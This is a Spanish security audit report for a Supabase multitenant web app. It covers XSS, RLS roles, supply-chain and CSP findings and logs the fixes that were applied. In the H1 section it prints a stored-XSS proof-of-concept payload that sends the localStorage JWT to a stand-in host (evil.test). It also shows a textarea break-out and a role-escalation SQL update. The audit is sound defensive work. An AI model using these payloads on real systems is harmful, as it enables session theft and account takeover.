# INFORME DE AUDITORÍA TÉCNICA — SIZO

**Fecha:** 2026-06-15
**Alcance:** Fases 0-2 + base Fase 3 (stack Supabase)
**Modo:** solo diagnóstico — sin cambios de código
**Auditores (roles asumidos):** Software Architect · Cybersecurity Engineer · AppSec Auditor · Backend Sr · QA Sr

---

## Resumen ejecutivo

Base arquitectónica **sólida**: RLS multitenant bien planteada, autorización vía `app_metadata` en el JWT (no en tablas — evita el escalamiento de privilegios clásico), soft-delete, índices con `tenant_id` al frente y capa `db.js` limpia.

Hay **2 hallazgos críticos y 5 graves** a resolver antes de crecer o salir a producción:

1. **H1 (Crítico):** Stored XSS generalizado + JWT en localStorage → robo de sesión del ADMIN y toma de control del tenant. **PoC confirmada localmente.**
2. **H2 (Crítico):** la suite de regresión corre con `service_role`, que **salta la RLS**. Los "11 PASS" validan mecánica CRUD, **no** el modelo de autorización.

| # | Hallazgo | Bloque | Severidad |
|---|----------|--------|-----------|
| H1 | Stored XSS generalizado + JWT en localStorage → toma del tenant | 2,3,5 | 🔴 Crítico — ✅ RESUELTO 2026-06-15 |
| H2 | Pruebas de regresión con `service_role` → no validan RLS ni roles | 6 | 🔴 Crítico — ✅ RESUELTO 2026-06-15 |
| H3 | Política self-update de `usuarios` sin acotar columnas (privesc latente) | 2,3 | 🟠 Grave — ✅ RESUELTO 2026-06-15 |
| H4 | `db.js` conversión de keys frágil/no testeada para JSONB | 1,5 | 🟠 Grave → 🟡 reclasificado — ✅ RESUELTO 2026-06-15 |
| H5 | `err.message` renderizado como HTML → fuga de internals + vector XSS | 2,5 | 🟠 Grave — ✅ RESUELTO 2026-06-15 |
| H6 | `supabase-js` desde CDN `esm.sh` sin pin ni SRI (cadena de suministro) | 2 | 🟠 Grave — ✅ RESUELTO 2026-06-15 |
| H7 | Sin Content-Security-Policy ni headers de seguridad | 2 | 🟠 Grave — ✅ RESUELTO 2026-06-15 |
| H8 | Sin paginación + `select('*')` en todas las listas | 1,4 | ✅ Resuelto (parcial) |
| H9 | `empresas_ids`/`role` del JWT desincronizable de la tabla (authz obsoleta) | 2 | 🟡 Medio |
| H10 | Funciones RLS evaluadas por fila (`user_empresas()` con subquery) | 4 | 🟡 Medio |
| H11 | Test de indicadores reimplementa la fórmula en vez de importar el motor | 6 | 🟡 Medio |
| H12 | Fórmulas de indicadores a verificar vs. Dec. 1072 / conteo "26 KPIs" | 5 | 🟡 Medio |
| H13 | Recuperación de contraseña no implementada | 2 | 🟡 Medio |
| H14 | Comentarios/nombres obsoletos ("Firebase"); clave `_empresas` no declarada | 1 | 🟢 Menor |
| H15 | `asesor_id` se muestra como UUID crudo; gating de rol del router es cosmético | 1 | 🟢 Menor |

---

## BLOQUE 1 — Arquitectura

**Fortalezas:** separación clara (store / router / db / módulos / componentes); patrón `crearModulo` (`_crud.js`) como reutilización declarativa; autorización centralizada en RLS + JWT.

- **H4 (Grave) — `db.js` mangla keys JSONB.** `keysTo()` recorre objetos **recursivamente** convirtiendo camel↔snake; cuando el valor es JSONB de negocio (`inspecciones.hallazgos`, `auditorias.evaluaciones`, `configuracion.metas_custom`, `empresas.centros`) transforma también sus claves internas. **Impacto:** alteración silenciosa de datos en módulos Fase 3. **Fix:** lista blanca de columnas JSON a NO transformar.
- **H5 (Grave) — `${err.message}` inyectado en HTML** (`seguimiento`, `indicadores`, `empresas`, `_crud`…). Expone internals de PostgreSQL/PostgREST y es sink de XSS. **Fix:** mensaje genérico + `textContent`; log técnico aparte.
- **H8 (Medio) — Sin paginación, `select('*')`.** Acoplamiento al "traer todo"; crece sin techo. **Fix:** `.range()` + columnas explícitas.
- **H14/H15 (Menor):** `store.js` comenta "Firebase Auth user" (stack migrado); `_empresas` se usa pero no está en el estado inicial; gating del `router.js` es solo UX (defensa real = RLS).

---

## BLOQUE 2 — Seguridad (Auth / Authz / Tenant)

**Verificado OK:** la autorización se lee de `auth.jwt()->app_metadata`, no de la tabla `usuarios`. INSERT valida `tenant_id() = tenant_id` (no se inserta en otro tenant). En políticas UPDATE con solo `USING`, PostgreSQL **reusa la expresión como `WITH CHECK`** → **no** se puede mover una fila a otro tenant vía UPDATE (riesgo aparente descartado). CONSULTA queda sin escritura porque `can_write_empresa = is_admin() OR (is_asesor() AND ...)`.

- **H3 (Grave) — self-update de `usuarios` demasiado amplio.** `for update using (id = auth.uid())`; el `WITH CHECK` por defecto solo exige `id = auth.uid()`, **sin acotar columnas**. Un CONSULTA puede `update usuarios set rol='ADMIN', tenant_id='<otro>' where id=auth.uid()`. **Hoy no escala** (authz vive en JWT) pero es **escalamiento latente** + corrupción de integridad. Demostrado en `poc-rls-roles.mjs` (TEST D). **Fix:** restringir a columnas de perfil (`nombre, tel, ciudad, bday, linkedin`) vía trigger o `WITH CHECK` que congele `rol/tenant_id/empresas_ids`.
- **H9 (Medio) — JWT obsoleto.** Cambios de `empresas_ids`/`role` no aplican hasta re-login. **Fix:** forzar refresh de claims tras cambios.
- **H13 (Medio) — Sin recuperación de contraseña.** Falta `resetPasswordForEmail` + pantalla.
- **Informativo:** `SUPABASE_ANON` commiteada en `supabase.js` = correcto (clave pública). `.env` NO está en git; `.gitignore` cubre `.env` y `*service-account*`. `service_role` solo server-side. ✅

---

## BLOQUE 3 — Pruebas de ciberseguridad (con PoC)

- **A01 Broken Access Control:** aislamiento por tenant correcto a nivel BD; ADMIN-only en `casos_medicos`/`configuracion`/`eval_estructura` con `is_admin()`. **Pendiente:** validación automatizada autenticada → `poc-rls-roles.mjs`.
- **Privilege Escalation:** CONSULTA→ASESOR/ADMIN y ASESOR→ADMIN **no posibles** vía JWT (solo `service_role` cambia `app_metadata`). Único vector: H3 (latente).
- **JWT Manipulation:** token firmado (HS256); alterar `tenant_id`/`role` invalida la firma → rechazado. El riesgo real es **robarlo** (H1).
- **SQLi:** no hay SQL construido por string; todo PostgREST parametrizado. ✅
- **XSS / Stored / DOM → H1 (Crítico, CONFIRMADO):** todos los módulos construyen HTML con template literals sin escapar (`${em.nombre}`, `${item.descripcion}`, `${u.email}`, observaciones, `${err.message}`). PoC local (`poc-xss.mjs`) confirma:
  - Sink celda: `<img src=x onerror="fetch('//evil.test/r?t='+localStorage.getItem('sb-ifqzdrqzjgsdhjbqkbba-auth-token'))">` sobrevive sin escapar.
  - Sink `<textarea>` (seguimiento.js): `</textarea><script>…</script>` rompe el contenedor e inyecta script.
  - Con `persistSession:true` el JWT está en `localStorage['sb-ifqzdrqzjgsdhjbqkbba-auth-token']` → exfiltrable → toma de control del tenant.
  - **Fix:** escape HTML obligatorio (helper `esc()` / `textContent` / `createElement`) + CSP (H7).
- **Storage Security:** `acciones.evidencia_path` existe pero aún no hay buckets. Al implementarlos: RLS de Storage por `tenant_id`/`empresa_id` en el path. (Requisito Fase 3/4.)
- **OWASP Top 10:** A01 ✅BD/⚠️tests · A02 JWT en localStorage (H1) · A03 XSS (H1) / SQLi ✅ · A04 H3 + sin reset pwd · A05 sin CSP/headers (H7) · A06 CDN sin pin (H6) · A07 sin reset/MFA · A08 sin SRI (H6) · A09 solo `console`, sin auditoría de eventos · A10 N/A.

---

## BLOQUE 4 — Base de datos / Escalabilidad

- **Índices:** bien diseñados, `tenant_id` al frente, cubren los patrones de query. ✅
- **H10 (Medio) — RLS por fila.** `can_read_empresa()` → `user_empresas()` ejecuta `array(select …)` + `= any(...)` por fila. **Fix:** envolver llamadas en `(select tenant_id())` para que el planificador las trate como `InitPlan` (constante por query) — patrón recomendado por Supabase.
- **Simulación de crecimiento:** 100 empresas OK · 500 los listados sin paginar pesan (H8) · 1000 `select('*')` sin `range()` + RLS por fila degradan dashboard/listas. **Acción:** paginar + columnas explícitas + optimizar RLS antes de 200+ empresas.
- **Integridad:** FKs sin `on delete` explícito (mitigado por soft-delete). Menor.

---

## BLOQUE 5 — Calidad de código

- Duplicación de `MESES`, `COLOR_SEM`, `semaforo` en `indicadores.js`, `dashboard.js`, `table.js`, `_crud.js` → extraer a módulo común.
- `dashboard.js` reimplementa el cálculo plan/ausentismo inline (líneas 140-141) en vez de usar `calcularIndicadores` → drift.
- **H12 (Medio):** `calcularIndicadores` retorna ~21 KPIs; la doc dice "26". `ISA = diasCarg/trab*100` e `ILI` no usan la base de 240.000 HHT habitual del Dec. 1072. **Verificar con experto SST** antes de reportería oficial.
- `_crud.js`: `guardar()` solo valida "requerido"; confía en RLS y `check` de Postgres (error crudo → H5).

---

## BLOQUE 6 — Cobertura de pruebas

- **H2 (Crítico):** `test2`/`test3` usan cliente `admin` (`service_role`) → **ignoran RLS**. Solo `test1` cubre anónimo. **No se prueba:** CONSULTA no escribe, ASESOR no ve empresas ajenas, `casos_medicos` ADMIN-only, aislamiento entre tenants. **Fix:** suite autenticada por rol → entregada en `poc-rls-roles.mjs`.
- **H11 (Medio):** `test2` reimplementa la fórmula → debe importar `calcularIndicadores`.
- **Faltan suites:** matriz de roles, aislamiento ASESOR↔empresa, `casos_medicos`, XSS/escape, mangling JSONB (H4), agregación del dashboard, Edge Function `crear-tenant`.

---

## Plan de corrección sugerido

1. **Inmediato (Crítico):** escape HTML global (H1) + revisar storage del token; suite RLS autenticada (H2 → `poc-rls-roles.mjs`).
2. **Alta (Grave):** acotar self-update de `usuarios` (H3); fix mangling JSONB (H4); no renderizar `err.message` (H5); pinear `supabase-js` + SRI o bundle local (H6); CSP/headers (H7).
3. **Media:** paginación + columnas (H8); optimizar RLS (H10); refresh de claims (H9); reset pwd (H13); validar fórmulas (H12).
4. **Menor:** limpieza store/comentarios (H14), UX `asesor_id` (H15), deduplicar constantes.

---

## Artefactos de esta auditoría (`testing/QA/`)

| Archivo | Contenido |
|---------|-----------|
| `INFORME-AUDITORIA-2026-06-15.md` | Este informe |
| `poc-xss.mjs` | PoC H1 — reproduce los 3 sinks de XSS localmente (sin red). `node testing/QA/poc-xss.mjs` |
| `poc-rls-roles.mjs` | PoC H2/H3 — suite RLS autenticada por rol. ⚠️ crea usuarios/empresas de prueba en Supabase real |

> **Estado:** correcciones en curso por orden aprobado.

## Registro de correcciones

### H1 — Stored XSS + JWT en localStorage — ✅ RESUELTO (2026-06-15)

**Fix aplicado:**
- Nuevo helper `escape.js` (`esc()`) que escapa `& < > " '`.
- Escape de TODO dato dinámico (BD/usuario) interpolado como HTML en:
  componentes `toast.js`, `modal.js`, `sidebar.js`, `topbar.js`, `table.js`;
  factory `modules/_crud.js` (celdas + inputs de formularios) y `modules/acciones.js`;
  módulos `empresas.js`, `usuarios.js`, `seguimiento.js`, `indicadores.js`, `dashboard.js`.
- `toast.js` y `modal.js` escapan centralmente mensaje y título → cubren todas sus llamadas.
- El catálogo de indicadores (`catalogo.js`) es estático (no BD) → no requiere escape.

**Sobre el JWT en localStorage:** en una SPA estática con supabase-js el token debe
residir en almacenamiento accesible por JS (localStorage por defecto); no es eliminable
sin un backend con cookies httpOnly. El vector real de robo era el XSS, ya neutralizado.
El endurecimiento adicional (CSP que bloquee exfiltración) se aborda en **H7**.

**Verificación:** `node testing/QA/poc-xss.mjs` → **4 PASS · 0 FAIL** (celda de tabla,
break-out de `<textarea>`, atributo `value`, toast/modal). `node --check` OK en los 13
archivos. Smoke test del servidor: 200 en `/`, `/escape.js` y módulos. El script
`poc-xss.mjs` queda como **prueba de regresión** de H1.

### H2 — Pruebas con service_role no validan RLS — ✅ RESUELTO (2026-06-15)

**Fix aplicado:**
- Nueva **suite de seguridad oficial** `scripts/test-seguridad-rls.mjs`: inicia sesión
  real (cliente anon) como CONSULTA y ASESOR y verifica el modelo de autorización
  (anónimo sin acceso, CONSULTA solo lectura, aislamiento ASESOR↔empresa, `casos_medicos`
  ADMIN-only). Incluye limpieza automática (`try/finally`) y código de salida.
- `scripts/test-regresion.mjs`: aclarado en cabecera que su alcance es **mecánica CRUD**
  con service_role y **no** valida RLS.
- `package.json`: nuevos scripts `npm test` (mecánica + seguridad), `test:mecanica`,
  `test:seguridad`. (Se eliminó el script `deploy` muerto que apuntaba a Firebase.)
- El PoC `testing/QA/poc-rls-roles.mjs` se conserva como evidencia y apunta a la suite oficial.
- TEST 5 (H3) queda como **known-issue**: reporta pero no rompe el build hasta corregir H3;
  convertir a check requerido al cerrar H3.

**Verificación:** `npm test` → mecánica **11 PASS · 0 FAIL** + seguridad **6 PASS · 0 FAIL ·
1 known-issue (H3)**. Artefactos de prueba eliminados automáticamente (verificado: 0 restantes).

### H3 — Self-update de `usuarios` sin acotar columnas — ✅ RESUELTO (2026-06-15)

**Fix aplicado:**
- Migración `supabase/migrations/002_h3_proteger_usuarios.sql`: trigger `BEFORE UPDATE`
  `usuarios_proteger_columnas()` que hace inmutables `rol`, `tenant_id`, `empresas_ids`,
  `id` y `email` para clientes (`auth.role() = 'authenticated'`). Solo el backend
  (`service_role`: provisión / Edge Functions) puede cambiarlas — el flujo previsto.
- Las políticas RLS no pueden restringir columnas; el trigger es la vía quirúrgica y no
  altera la visibilidad de filas. No afecta la edición de perfil (nombre/tel/ciudad/bday/
  linkedin) ni la provisión.
- Aplicada manualmente en el SQL Editor de Supabase (mismo flujo que la migración 001).

**Verificación:** `npm run test:seguridad` → **7 PASS · 0 FAIL**. El TEST 5 (CONSULTA intenta
`update usuarios set rol='ADMIN'`) ahora es bloqueado por el trigger y quedó como check
**REQUERIDO** (ya no known-issue). Antes del fix el cambio de rol tenía éxito.

### H4 — Conversión de keys / JSONB — ✅ RESUELTO (reclasificado) (2026-06-15)

**Corrección del diagnóstico:** la prueba empírica mostró que `keysTo()` **no recursa**
dentro de los valores; el contenido JSONB se preservaba **verbatim** y hacía round-trip
consistente. **No había corrupción de datos** (el informe original sobreestimó el impacto).
El riesgo real era de **fragilidad**: el comportamiento correcto era implícito, no
documentado y no testeado, y el motor estaba embebido en `db.js` (que importa `esm.sh`),
impidiendo testearlo aislado.

**Fix aplicado (blindaje, sin cambio de comportamiento):**
- Extraído el motor de conversión a un módulo puro `case-convert.js`, con el **contrato
  documentado**: conversión shallow de columnas, contenido JSONB preservado verbatim.
- `db.js` ahora importa `toSnake/toRow/fromRow` de ahí (mantiene sus exports).
- Nuevo test `testing/QA/poc-jsonb-roundtrip.mjs` que ejercita el código real y fija el
  contrato (falla si alguien hace recursión profunda y rompe JSONB). Añadido a `npm test`
  como `test:unit`.

**Verificación:** `npm run test:unit` → **6 PASS · 0 FAIL**. `npm test` (unit + mecánica +
seguridad) → **6 + 11 + 7 PASS · 0 FAIL**. Smoke test: `db.js`, `case-convert.js` y módulos
cargan (200).

### H5 — `err.message` renderizado como HTML — ✅ RESUELTO (2026-06-15)

**Fix aplicado:**
- Nuevo helper `errores.js` → `errorUsuario(err, contexto)`: registra el detalle técnico
  en consola (`console.error`) y devuelve un mensaje **genérico, sin internals y sin
  metacaracteres HTML** (seguro para `innerHTML`, `textContent` y `toast`).
- Reemplazados los 12 puntos que exponían `err.message` al usuario en `router.js`,
  `modules/_crud.js` (3), `usuarios.js` (2), `empresas.js` (2), `dashboard.js`,
  `indicadores.js`, `seguimiento.js` (2).
- Quedan (correctos): `console.error` de `auth.js`; mensajes controlados de sesión vía
  `textContent`; el mapeo amigable de login (`mensajeError`); y los `throw new Error` de
  `db.js`, que ahora son capturados por `errorUsuario` aguas abajo.

**Verificación:** prueba del helper con un error real de PostgREST + payload XSS → el usuario
recibe el mensaje genérico (sin `constraint`/`usuarios_pkey` ni `<img onerror>`); el detalle
queda solo en consola. `node --check` OK en los 8 archivos; smoke test 200.

### H6 — `supabase-js` desde CDN sin pin ni SRI — ✅ RESUELTO (2026-06-15)

**Contexto:** `supabase.js` cargaba la librería con un *import de módulo ES* desde
`https://esm.sh/@supabase/supabase-js@2` (versión no fijada). SRI **no aplica a imports de
módulo** (solo a `<script integrity>`), así que la única defensa real en una SPA estática es
**vendorizar** la dependencia.

**Fix aplicado:**
- Bundle ESM fijado a la versión exacta **2.108.1** descargado a `vendor/supabase-js@2.108.1.js`
  (212 KB) junto con sus 5 polyfills de Node (`vendor/node/{buffer,process,events,tty,async_hooks}.mjs`).
- Reescritas todas las rutas absolutas `/node/*` a rutas **locales relativas** → el grafo es
  100% autocontenido (verificado: 0 imports a esm.sh/CDN; las únicas URLs `https` que quedan
  son literales/comentarios).
- `supabase.js` ahora importa `./vendor/supabase-js@2.108.1.js` (con nota de cómo actualizar).
- `vendor/` se publica en GitHub Pages (no está en `exclude_assets`); el código se sirve desde
  el propio repo, eliminando el riesgo de compromiso del CDN y de disponibilidad.

**Verificación:** `node --check` OK en bundle, polyfills y `supabase.js`; el grafo completo se
sirve sin 404 (200 en bundle + 5 polyfills); el bundle exporta `createClient` (named export que
usa `supabase.js`). Los scripts Node (provisión/seed/tests) siguen usando `@supabase/supabase-js`
de `node_modules` (server-side, sin riesgo de CDN en runtime de usuario). **Pendiente de
confirmación manual:** login en el navegador (no puedo conducir el navegador desde aquí; los
archivos vendorizados son byte-idénticos a los que esm.sh servía, solo localizados).

### H7 — Sin CSP ni headers de seguridad — ✅ RESUELTO (2026-06-15)

**Fix aplicado:**
- **`index.html`**: `<meta http-equiv="Content-Security-Policy">` con política estricta —
  `script-src 'self'` (sin inline; bloquea `<script>`/`onerror` inyectados → defensa en
  profundidad sobre H1), `style-src 'self' 'unsafe-inline' fonts.googleapis.com` (necesario
  por los `style=""` y `<style>` inyectados + Google Fonts), `font-src` gstatic,
  `img-src 'self' data:` (favicon), `connect-src` al host Supabase (https + wss),
  `object-src 'none'`, `base-uri`/`form-action 'self'`. Más `<meta name="referrer">`.
  Se eligió `meta` porque **GitHub Pages no permite headers HTTP**.
- **`serve.json`** (local y hosts que lo respeten): set completo de headers, incluidos los que
  NO se pueden poner por meta — `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`,
  `Referrer-Policy`, `Permissions-Policy`, y CSP con `frame-ancestors 'none'`.

**Verificado:** la app no usa scripts inline ni handlers `on*=` (compatible con `script-src
'self'`); `serve.json` emite los 5 headers correctamente (comprobado con `curl -I`); meta CSP
y referrer presentes en el HTML servido.

**Producción (GitHub Pages):** Pages ignora headers HTTP; la meta-CSP cubre la mayor parte.
Para `X-Frame-Options`/`nosniff`/HSTS/`frame-ancestors` reales en prod, configurarlos en
**Cloudflare** (ya en el stack) como Transform Rules / Response Headers.

**Pendiente de confirmación manual:** recargar en el navegador y revisar la consola: no debe
haber violaciones de CSP que rompan login, carga de datos (Supabase) ni fuentes.

### H8 — Sin paginación, `select('*')` en todas las listas — ✅ RESUELTO (parcial) (2026-06-16)

**Fix aplicado:**
- `db.js`: `list()` ahora acepta `limit` (default **500**) y aplica `.limit()` en la query
  de Supabase. Al ser un parámetro con valor por defecto, todos los call sites existentes
  (`empresas.js`, `usuarios.js`, `dashboard.js`, `topbar.js`, `modules/_crud.js`) quedan
  protegidos automáticamente sin tocarlos; pueden pasar `limit` explícito si alguna lista
  necesita más en el futuro.
- **Alcance:** se decidió cubrir solo el techo de filas (`.limit()`), no reemplazar
  `select('*')` por columnas explícitas — eso requeriría revisar caso por caso qué columnas
  usa cada módulo, con mayor riesgo de omitir una y romper la UI, para un beneficio menor
  (cosmético/performance) frente al riesgo real ("traer todo sin techo").

**Verificación:** `npm test` → **24 PASS · 0 FAIL** (unit H4, regresión mecánica, seguridad
RLS) — el cambio no alteró el comportamiento de ningún listado probado.
